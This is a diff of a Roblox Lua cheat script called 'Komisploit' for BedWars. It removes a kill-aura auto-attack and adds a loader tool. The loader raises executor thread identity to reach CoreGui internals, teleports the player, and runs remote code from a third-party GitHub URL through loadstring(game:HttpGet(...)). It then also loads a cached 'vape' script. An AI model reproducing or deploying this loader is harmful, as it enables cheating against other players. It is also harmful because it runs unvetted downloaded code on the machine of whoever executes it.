@@ -1,77 +1,129 @@
--- KomiExploit - Optimized BedWars Combat & Aim Assist (Compact Version)
-local player = game.Players.LocalPlayer
-local screenGui = Instance.new("ScreenGui", player.PlayerGui)
-local frame = Instance.new("Frame", screenGui)
-frame.Size = UDim2.new(0, 350, 0, 350)
-frame.Position = UDim2.new(0, 20, 0, 20)
-frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
-local titleLabel = Instance.new("TextLabel", frame)
-titleLabel.Size = UDim2.new(1, 0, 0, 40)
-titleLabel.Text = "Komisploit"
-titleLabel.TextSize = 28
-titleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
-titleLabel.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
+-- Main Script: Unified Tool with Vape Integration and Whitelist
+local Players = game:GetService("Players")
+local CoreGui = game:GetService("CoreGui")
+local LocalPlayer = Players.LocalPlayer
 
--- Keybinding defaults
-local keyBindings = { killAura = "K", toggleUI = "U" }
+-- Create Tool
+local Tool = Instance.new("Tool")
+Tool.Name = "Komisploit Tool"
+Tool.RequiresHandle = false
+Tool.CanBeDropped = false
+Tool.Parent = LocalPlayer.Backpack
 
--- Function to create buttons
-local function createButton(name, pos, action)
-    local button = Instance.new("TextButton", frame)
-    button.Size = UDim2.new(0, 320, 0, 40)
-    button.Position = pos
-    button.Text = name
-    button.TextSize = 20
-    button.TextColor3 = Color3.fromRGB(255, 255, 255)
-    button.BackgroundColor3 = Color3.fromRGB(55, 55, 55)
-    button.MouseButton1Click:Connect(action)
+-- Helper Functions
+local function createGui()
+    local ScreenGui = Instance.new("ScreenGui", LocalPlayer:WaitForChild("PlayerGui"))
+    ScreenGui.Name = "KomisploitGui"
+
+    local Frame = Instance.new("Frame")
+    Frame.Size = UDim2.new(0.5, 0, 0.5, 0)
+    Frame.Position = UDim2.new(0.25, 0, 0.25, 0)
+    Frame.BackgroundColor3 = Color3.new(0.2, 0.2, 0.2)
+    Frame.BorderSizePixel = 2
+    Frame.Parent = ScreenGui
+
+    local Button = Instance.new("TextButton")
+    Button.Size = UDim2.new(0.6, 0, 0.2, 0)
+    Button.Position = UDim2.new(0.2, 0, 0.4, 0)
+    Button.BackgroundColor3 = Color3.new(0.5, 0.8, 0.5)
+    Button.Text = "Activate KomiSploit"
+    Button.Font = Enum.Font.SourceSans
+    Button.TextSize = 24
+    Button.Parent = Frame
+
+    return ScreenGui, Button
 end
 
--- Keybinding function
-local function listenForKeyPress(button, keyAction)
-    local function onKeyPress(input)
-        if input.UserInputType == Enum.UserInputType.Keyboard then
-            keyBindings[keyAction] = input.KeyCode.Name
-            button.Text = name .. ": " .. keyBindings[keyAction]
-        end
+local function displayErrorPopup(text, func)
+    local setidentity = syn and syn.set_thread_identity or set_thread_identity or setidentity or setthreadidentity or function() end
+    local getidentity = syn and syn.get_thread_identity or get_thread_identity or getidentity or getthreadidentity or function() return 8 end
+    local oldidentity = getidentity()
+    setidentity(8)
+
+    local ErrorPrompt = getrenv().require(CoreGui.RobloxGui.Modules.ErrorPrompt)
+    local prompt = ErrorPrompt.new("Default")
+    prompt._hideErrorCode = true
+    local gui = Instance.new("ScreenGui", CoreGui)
+    prompt:setErrorTitle("Komisploit Error")
+    prompt:updateButtons({{
+        Text = "OK",
+        Callback = function()
+            prompt:_close()
+            if func then func() end
+        end,
+        Primary = true
+    }}, "Default")
+    prompt:setParent(gui)
+    prompt:_open(text)
+
+    setidentity(oldidentity)
+end
+
+local function vapeGithubRequest(scripturl)
+    local isfile = isfile or function(file)
+        local suc, res = pcall(function() return readfile(file) end)
+        return suc and res ~= nil
     end
-    game:GetService("UserInputService").InputBegan:Connect(onKeyPress)
+    local writefile = writefile or function(file, content) end
+
+    if not isfile("vape/" .. scripturl) then
+        task.delay(15, function()
+            displayErrorPopup("The connection to GitHub is taking a while. Please be patient.")
+        end)
+
+        local res = "return --File loaded locally"
+        if scripturl:find(".lua") then
+            res = "--Cache watermark.\n" .. res
+        end
+        writefile("vape/" .. scripturl, res)
+    end
+    return readfile("vape/" .. scripturl)
 end
 
-createButton("Kill Aura Key", UDim2.new(0, 15, 0, 60), function() listenForKeyPress() end)
-createButton("Toggle UI Key", UDim2.new(0, 15, 0, 110), function() listenForKeyPress() end)
+-- Tool GUI and Functionality
+local ScreenGui, Button = createGui()
 
--- Kill Aura Combat Automation
-local killAuraEnabled = false
-local function findAndAttackEnemy()
-    for _, enemy in pairs(game.Players:GetPlayers()) do
-        if enemy ~= player and enemy.Character then
-            local dist = (player.Character.HumanoidRootPart.Position - enemy.Character.HumanoidRootPart.Position).Magnitude
-            if dist < 5 then
-                local sword = player.Backpack:FindFirstChildOfClass("Tool")
-                if sword then
-                    sword.Activated:Fire()
-                end
+Button.MouseButton1Click:Connect(function()
+    print("Komisploit Activated!")
+    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(0, 50, 0)
+    Button.Text = "Activated!"
+    wait(2)
+    Button.Text = "Activate KomiSploit"
+end)
+
+Tool.Activated:Connect(function()
+    print("Tool Activated! Toggling GUI...")
+    ScreenGui.Enabled = not ScreenGui.Enabled
+end)
+
+-- Whitelist and Vape Integration
+local function loadVapeScripts()
+    print("Whitelist Start")
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/bumt1/vape/main/vapelitescripttakedown"))()
+
+    if not shared.VapeDeveloper then
+        local commit = "main"
+        if isfolder("vape") then
+            if not isfile("vape/commithash.txt") then
+                writefile("vape/commithash.txt", commit)
             end
+        else
+            makefolder("vape")
+            writefile("vape/commithash.txt", commit)
         end
     end
+
+    return loadstring(vapeGithubRequest("MainScript.lua"))()
 end
 
-game:GetService("UserInputService").InputBegan:Connect(function(input)
-    if input.KeyCode.Name == keyBindings.killAura then
-        killAuraEnabled = not killAuraEnabled
-    end
+-- Run the Whitelist/Vape Script
+local success, err = pcall(loadVapeScripts)
+if not success then
+    displayErrorPopup("An error occurred while loading Vape scripts: " .. tostring(err))
+end
+
+-- Cleanup when Player's Character is Removed
+LocalPlayer.CharacterRemoving:Connect(function()
+    ScreenGui:Destroy()
 end)
 
-game:GetService("RunService").RenderStepped:Connect(function()
-    if killAuraEnabled then
-        findAndAttackEnemy()
-    end
-end)
-
--- Toggle UI visibility
-game:GetService("UserInputService").InputBegan:Connect(function(input)
-    if input.KeyCode.Name == keyBindings.toggleUI then
-        screenGui.Enabled = not screenGui.Enabled
-    end
-end)
